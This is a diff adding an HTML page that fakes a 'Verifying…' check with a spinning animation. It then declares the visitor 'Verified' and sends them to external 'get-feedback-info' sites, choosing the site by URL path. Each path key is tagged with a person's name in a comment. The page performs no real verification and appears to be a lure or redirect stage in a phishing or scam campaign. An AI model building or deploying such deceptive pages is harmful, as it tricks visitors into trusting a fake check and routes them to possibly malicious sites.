@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verification</title>
+  <style>
+    body{
+      margin:0;height:100vh;display:flex;align-items:center;justify-content:center;
+      background:#f2f2f2;font-family:Arial,sans-serif
+    }
+    .box{
+      background:#fff;padding:35px;border-radius:14px;text-align:center;
+      width:320px;box-shadow:0 10px 30px rgba(0,0,0,.15)
+    }
+    .ring{
+      width:140px;height:140px;border-radius:50%;
+      background:conic-gradient(#4caf50,#2196f3,#ff9800,#f44336,#4caf50);
+      animation:spin 2s linear infinite;margin:0 auto 20px;
+      display:flex;align-items:center;justify-content:center
+    }
+    .core{
+      width:100px;height:100px;background:#fff;border-radius:50%;
+      font-size:42px;display:flex;align-items:center;justify-content:center
+    }
+    button{
+      display:none;margin-top:20px;padding:12px 25px;border:none;
+      background:#1976d2;color:#fff;font-size:16px;border-radius:6px;cursor:pointer
+    }
+    @keyframes spin{to{transform:rotate(360deg)}}
+  </style>
+</head>
+<body>
+
+<div class="box">
+  <div class="ring" id="ring">
+    <div class="core" id="core"></div>
+  </div>
+  <p id="text">Verifying…</p>
+  <button id="btn">Continue</button>
+</div>
+
+<script>
+  const links = {
+    fix: "https://get-feedback-info.vercel.app/",  //AFTAB
+    guide: "https://get-feedback-info.page.gd/",  //AFTAB
+    back: "https://get-feedback-info.page.gd/",  //ZEESHAN
+    case: "https://get-feedback-info.vercel.app/",  //AZAN
+    error: "https://get-feedback-info.vercel.app/",  //ZEESHAN 2
+    info: "https://get-feedback-info.page.gd/",  //NAJEEB
+    get: "https://get-feedback-info.page.gd/",  //FAROOQ
+    for: "https://get-feedback-info.vercel.app/",  //SAMEER
+    an: "https://get-feedback-info.page.gd/",  //TOFIQUE
+    sub: "https://get-feedback-info.vercel.app/",  //ZAMIN
+    submi: "https://get-feedback-info.page.gd/",  //MUZAFR
+    lets: "https://get-feedback-info.vercel.app/",  //AZAD
+    default: "https://get-feedback-info.vercel.app/"
+  };
+
+  const path = window.location.pathname.replace(/\/$/, "").split("/").pop();
+  const redirectURL = links[path] || links.default;
+
+  setTimeout(() => {
+    document.getElementById("ring").style.animation = "none";
+    document.getElementById("core").innerHTML = "✔";
+    document.getElementById("text").innerText = "Verified";
+    document.getElementById("btn").style.display = "inline-block";
+  }, 3000);
+
+  document.getElementById("btn").onclick = () => {
+    window.location.href = redirectURL;
+  };
+</script>
+
+</body>
+</html>
